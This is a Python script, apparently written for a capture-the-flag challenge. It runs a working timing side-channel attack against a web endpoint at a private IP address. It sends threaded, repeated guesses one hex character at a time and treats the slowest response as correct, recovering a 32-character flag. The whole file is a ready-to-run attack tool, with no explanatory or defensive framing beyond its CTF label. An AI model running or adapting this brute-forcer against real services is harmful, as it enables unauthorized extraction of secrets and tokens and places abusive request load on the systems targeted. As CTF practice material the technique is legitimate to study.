#!/usr/bin/env python3
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from statistics import median

# ------------------ CONFIG ------------------
BASE_URL = "http://10.1.181.96:5000/submit"
PARAM = "flag"
PREFIX = "flag{"
SUFFIX = "}"
HEX_CHARS = '0123456789abcdef'

# Optimized settings
NUM_THREADS = 8       # Moderate parallelism
NUM_SAMPLES = 3       # Multiple samples for reliability
# --------------------------------------------

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(
    pool_connections=NUM_THREADS,
    pool_maxsize=NUM_THREADS * 2,
    max_retries=0
)
session.mount('http://', adapter)

req_count = 0
start_time = None

def test_flag_timing(flag_guess):
    """Test flag and measure ACTUAL response time accurately"""
    global req_count
    
    headers = {
        'X-Forwarded-For': flag_guess,
        'Connection': 'keep-alive',
    }
    
    try:
        # Use high-precision timer
        t0 = time.perf_counter()
        
        response = session.get(
            BASE_URL,
            params={PARAM: flag_guess},
            headers=headers,
            timeout=10
        )
        
        # Measure elapsed time
        elapsed = time.perf_counter() - t0
        
        req_count += 1
        
        # Check for success
        body = response.text.lower()
        if "correct" in body or "congrat" in body or "success" in body:
            print(f"\n[+] SUCCESS: {flag_guess}")
            print(response.text[:500])
            return float('inf')
        
        # Try to get server-side timing from header
        server_time = response.headers.get('X-Response-Time') or response.headers.get('x-response-time')
        
        if server_time and server_time != '0':
            try:
                return float(server_time)
            except:
                pass
        
        # Use client-side measurement as fallback
        return elapsed
        
    except Exception as e:
        return 0.0

def test_character_multiple(char, known_hash, samples=NUM_SAMPLES):
    """Test character with multiple samples"""
    times = []
    
    for _ in range(samples):
        test_hash = known_hash + char
        flag_guess = f"{PREFIX}{test_hash}"
        
        t = test_flag_timing(flag_guess)
        if t > 0:
            times.append(t)
        
        # Small delay between samples
        time.sleep(0.01)
    
    if not times:
        return char, 0.0
    
    # Return median to reduce noise
    return char, median(times)

def brute_force_parallel_accurate():
    """Parallel testing with accuracy"""
    global start_time
    start_time = time.time()
    
    known_hash = ""
    MD5_LENGTH = 32
    
    print("=" * 70)
    print("CTF Flag Brute Forcer - PARALLEL + ACCURATE")
    print("=" * 70)
    print(f"Target: {BASE_URL}")
    print(f"Threads: {NUM_THREADS} | Samples per char: {NUM_SAMPLES}")
    print("=" * 70)
    
    for position in range(MD5_LENGTH):
        pos_start = time.time()
        elapsed_total = time.time() - start_time
        
        print(f"\n[{position + 1:02d}/32] Current: {PREFIX}{known_hash}")
        print(f"  Elapsed: {elapsed_total:.1f}s | Requests: {req_count}")
        
        results = []
        
        # Test characters in parallel
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {executor.submit(test_character_multiple, char, known_hash): char 
                      for char in HEX_CHARS}
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                try:
                    char, time_val = future.result()
                    results.append((char, time_val))
                    print(f"    [{completed:2d}/16] '{char}': {time_val:.6f}s", flush=True)
                except Exception as e:
                    print(f"    Error: {e}")
        
        # Sort by time (highest = correct)
        sorted_results = sorted(results, key=lambda x: x[1], reverse=True)
        
        # Show top 5
        print(f"\n  Top 5:")
        for i, (c, t) in enumerate(sorted_results[:5]):
            print(f"    {i+1}. '{c}': {t:.6f}s")
        
        best_char, best_time = sorted_results[0]
        second_char, second_time = sorted_results[1]
        
        confidence = (best_time / second_time) if second_time > 0 else 1.0
        
        known_hash += best_char
        pos_elapsed = time.time() - pos_start
        
        # Progress
        avg_per_pos = elapsed_total / (position + 1)
        eta = avg_per_pos * (32 - position - 1)
        
        print(f"\n  Selected: '{best_char}' ({best_time:.6f}s, {confidence:.2f}x vs 2nd)")
        print(f"  Position time: {pos_elapsed:.2f}s | Total: {elapsed_total:.1f}s | ETA: {eta:.1f}s")
        print(f"  Flag: {PREFIX}{known_hash}")
    
    elapsed = time.time() - start_time
    
    final_flag = f"{PREFIX}{known_hash}{SUFFIX}"
    
    print("\n" + "=" * 70)
    print(f"[+] COMPLETE: {final_flag}")
    print("=" * 70)
    
    # Verify
    print(f"\nVerifying...")
    verify_time = test_flag_timing(final_flag)
    print(f"Verification: {verify_time:.6f}s")
    
    print("\n" + "=" * 70)
    print(f"   TOTAL TIME: {elapsed:.2f} seconds ({elapsed/60:.2f} minutes)")
    print(f"   Requests: {req_count}")
    print(f"   Per position: {elapsed/32:.2f}s")
    print("=" * 70)
    
    return known_hash

def main():
    print(f"Target: {BASE_URL}\n")
    
    try:
        found_hash = brute_force_parallel_accurate()
        
        final_flag = f"{PREFIX}{found_hash}{SUFFIX}"
        print(f"\n FINAL FLAG: {final_flag}")
        print(f"\n Copy: {final_flag}")
        
    except KeyboardInterrupt:
        elapsed = time.time() - start_time if start_time else 0
        print(f"\n[!] Interrupted at {elapsed:.1f}s")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        session.close()

if __name__ == "__main__":
    main()
